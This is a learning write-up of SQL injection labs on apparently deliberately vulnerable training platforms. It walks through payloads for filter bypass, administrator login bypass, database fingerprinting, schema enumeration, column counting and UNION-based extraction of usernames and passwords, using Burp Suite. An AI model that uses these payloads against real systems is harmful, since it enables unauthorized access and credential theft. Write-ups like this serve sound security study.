# SQL Injection: From Basic Retrieval to UNION-Based Extraction
**Platforms:** CyLab Security Academy, PortSwigger Web Security Academy
**Category:** Web Exploitation (SQL Injection)
**Date:** July 2026
 
---
 
## Goal
Work through a series of SQL injection labs, starting with basic data retrieval and building up to full UNION based extraction of data from other tables.
 
---
 
## Initial Thoughts
I'd already done the basics of SQLi in CyLab's SQL Direct challenge so I went into the PortSwigger labs thinking the WHERE clause tricks would just carry over. That part was true, but what caught me off guard was how much of the later labs is just enumeration. You spend most of your time figuring out the database engine, the table names, the column count, and only right at the end do you actually get to pull data out. It changed how I think about SQLi. It's not really one clever payload, it's more of a process you work through step by step.
 
---
 
## Identifying the Vulnerability
Every lab had the same root problem. User input (a category filter, a login form, a search box) was being dropped straight into a SQL query with no sanitisation. Breaking out of the string with a single quote and adding my own logic confirmed the injection point each time. Same weakness, just showing up in a different part of the app each time.
 
---
 
## What is SQL Injection?
SQL injection happens when user input gets inserted into a database query without being sanitised first, which lets an attacker change what the query actually does. Depending on the app that could mean bypassing a filter, logging in as someone else, or pulling entire tables of data the app was never meant to expose.
 
---
 
## Method
 
### 1. Basic retrieval (CyLab, SQL Direct)
Injected into a filter field:
```
' OR '1'='1
```
This turns the query into something that's always true, so instead of returning the filtered results it returns everything.
 
### 2. Retrieving hidden data (PortSwigger)
Intercepted the request in Burp's Proxy and edited the category parameter directly:
```
' OR 1=1--
```
The `--` comments out the rest of the original query, which exposed products that were meant to be hidden or unreleased.
 
### 3. Login bypass (PortSwigger)
Caught the login request in Proxy and edited the username field:
```
administrator'--
```
This comments out the password check completely, so it logs you in as administrator without needing a valid password at all.
 
### 4. Fingerprinting the database (PortSwigger)
Sent the request to Repeater and injected a UNION payload to pull the database version straight into the page response:
```
' UNION SELECT @@version--
```
Good to confirm the engine and version before trying anything that's specific to one database type.
 
### 5. Listing database contents (PortSwigger)
Still working in Repeater, queried the information schema to map out what tables and columns actually exist:
```
' UNION SELECT table_name, NULL FROM information_schema.tables--
```
 
### 6. Determining number of columns (PortSwigger)
Used Intruder to fire off ORDER BY payloads with increasing numbers until one of them errored out:
```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   → errors here, so the table has 2 columns
```
 
### 7. Finding a column that accepts text (PortSwigger)
Back in Repeater, tested each column position on its own:
```
' UNION SELECT 'a',NULL--
' UNION SELECT NULL,'a'--
```
Whichever one didn't throw an error is the column that can actually display text back on the page.
 
### 8. Retrieving data from other tables (PortSwigger)
With the column count and the text column sorted, sent the real extraction payload through Repeater:
```
' UNION SELECT username, password FROM users--
```
 
### 9. Retrieving multiple values in a single column (PortSwigger)
Only had one usable column to work with here, so I concatenated both fields into it, again through Repeater:
```
' UNION SELECT NULL, username || ':' || password FROM users--
```
 
---
 
## Tools Used
- Browser (CyLab challenge)
- Burp Suite: Proxy to intercept the requests, Repeater to test and tweak payloads, Intruder to automate the column count enumeration
---
 
## What I Learned
Doing these labs back to back made it obvious that SQLi isn't just one trick, it's a process. You break the query logic, get past whatever auth is in the way, figure out what database you're actually dealing with, then enumerate properly before you extract anything. The UNION labs especially hammered home that you can't just jump straight to stealing data, you have to earn it by working out the column count and data types first. Same lesson I took from the SSTI challenge really: work through it in stages instead of guessing at the end result straight away.
 

 
